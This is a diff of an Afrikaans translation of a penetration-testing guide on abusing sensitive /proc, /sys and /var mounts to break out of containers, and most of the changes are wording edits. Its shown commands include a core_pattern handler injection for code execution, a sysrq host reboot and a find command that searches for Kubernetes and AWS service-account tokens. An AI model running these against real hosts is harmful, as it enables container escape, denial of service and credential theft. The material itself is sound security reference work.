@@ -15,13 +15,13 @@ Hierdie gids laat toegang toe om kernvariabeles te wysig, gewoonlik via `sysctl(
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Beskryf in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Laat die definisie van 'n program toe om uit te voer op kernlêer-generasie met die eerste 128 bytes as argumente. Dit kan lei tot kode-uitvoering as die lêer met 'n pyp `|` begin.
+- Laat toe om 'n program te definieer wat uitgevoer moet word op kernlêer-generasie met die eerste 128 bytes as argumente. Dit kan lei tot kode-uitvoering as die lêer met 'n pyp `|` begin.
 - **Toets en Exploit Voorbeeld**:
 
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Ja # Toets skrywe toegang
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Toets skrywe toegang
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Stel aangepaste handler in
+echo "|$overlay/shell.sh" > core_pattern # Stel pasgemaakte handler in
 sleep 5 && ./crash & # Trigger handler
 ```
 
@@ -43,15 +43,15 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 #### **`/proc/sys/fs`**
 
 - Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêerstelsel.
-- Skrywe toegang kan verskeie ontkenning-van-diens-aanvalle teen die gasheer moontlik maak.
+- Skrywe toegang kan verskeie ontkenning van diens-aanvalle teen die gasheer moontlik maak.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Laat die registrasie van interpreters vir nie-inheemse binêre formate gebaseer op hul magiese nommer toe.
-- Kan lei tot voorregverhoging of wortel-skaal toegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
+- Laat toe om interpreteerders vir nie-inheemse binêre formate te registreer gebaseer op hul magiese nommer.
+- Kan lei tot voorregverhoging of wortel-sheltoegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
 - Betrokke exploit en verduideliking:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-- In-diepte tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Diepgaande tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Ander in `/proc`
 
@@ -62,7 +62,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 
 #### **`/proc/sysrq-trigger`**
 
-- Laat die aanroep van Sysrq-opdragte toe, wat moontlik onmiddellike stelselhervattings of ander kritieke aksies kan veroorsaak.
+- Laat toe om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselhervattings of ander kritieke aksies kan veroorsaak.
 - **Hervatting van Gasheer Voorbeeld**:
 
 ```bash
@@ -102,11 +102,11 @@ echo b > /proc/sysrq-trigger # Hervat die gasheer
 #### **`/proc/mem`**
 
 - Alternatiewe interfase vir `/dev/mem`, wat fisiese geheue verteenwoordig.
-- Laat lees en skryf toe, wysiging van alle geheue vereis die oplos van virtuele na fisiese adresse.
+- Laat lees en skryf toe, wysiging van alle geheue vereis om virtuele na fisiese adresse op te los.
 
 #### **`/proc/sched_debug`**
 
-- Teruggee proses skedulering inligting, wat PID naamruimte beskermings omseil.
+- Gee proses skedulering inligting terug, wat PID naamruimte beskermings omseil.
 - Blootstel prosesname, ID's, en cgroup identifiseerders.
 
 #### **`/proc/[pid]/mountinfo`**
@@ -148,17 +148,17 @@ cat /output %%%
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Lek kern adresse, wat moontlik KASLR in gevaar stel.
+- Lek kern adresse, wat moontlik KASLR in gevaar kan stel.
 
 #### **`/sys/kernel/security`**
 
-- Huisves `securityfs` interfase, wat die konfigurasie van Linux Sekuriteitsmodules soos AppArmor toelaat.
+- Huisves `securityfs` interfase, wat konfigurasie van Linux Sekuriteitsmodules soos AppArmor toelaat.
 - Toegang mag 'n houer in staat stel om sy MAC-stelsel te deaktiveer.
 
 #### **`/sys/firmware/efi/vars` en `/sys/firmware/efi/efivars`**
 
 - Blootstel interfaces vir interaksie met EFI veranderlikes in NVRAM.
-- Verkeerde konfigurasie of eksploit kan lei tot gebroke skootrekenaars of onbootbare gasheer masjiene.
+- Misconfigurasie of eksploit kan lei tot gebroke skootrekenaars of onbootbare gasheer masjiene.
 
 #### **`/sys/kernel/debug`**
 
@@ -216,9 +216,9 @@ are/nginx/html/index2.html
 ```
 Die XSS is bereik:
 
-![Gestoor XSS via gemonteerde /var gids](/images/stored-xss-via-mounted-var-folder.png)
+![Gestoorde XSS via gemonteerde /var-gids](/images/stored-xss-via-mounted-var-folder.png)
 
-Let daarop dat die houer GEEN herstart of iets benodig nie. Enige veranderinge wat via die gemonteerde **/var** gids gemaak word, sal onmiddellik toegepas word.
+Let daarop dat die houer NIE 'n herstart of iets benodig nie. Enige veranderinge wat via die gemonteerde **/var**-gids gemaak word, sal onmiddellik toegepas word.
 
 Jy kan ook konfigurasie lêers, binêre lêers, dienste, toepassingslêers en skulpprofiele vervang om outomatiese (of semi-outomatiese) RCE te bereik.
 
@@ -226,8 +226,12 @@ Jy kan ook konfigurasie lêers, binêre lêers, dienste, toepassingslêers en sk
 
 Die houer kan K8s diensrekening tokens of AWS webidentiteit tokens lees wat die houer in staat stel om ongemagtigde toegang tot K8s of die wolk te verkry:
 ```bash
-/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
-/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
+<SNIP>
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
+/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
 #### Docker
 
@@ -249,7 +253,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Nota
 
-Die werklike paaie mag verskil in verskillende opstellings, wat is waarom jou beste kans is om die **find** opdrag te gebruik om die ander houers se lêerstelsels te lokaliseer.
+Die werklike paaie mag verskil in verskillende opstellings, wat is waarom jou beste kans is om die **find** opdrag te gebruik om die ander houers se lêerstelsels en SA / web identiteitstokens te lokaliseer.
 
 ### Verwysings
 
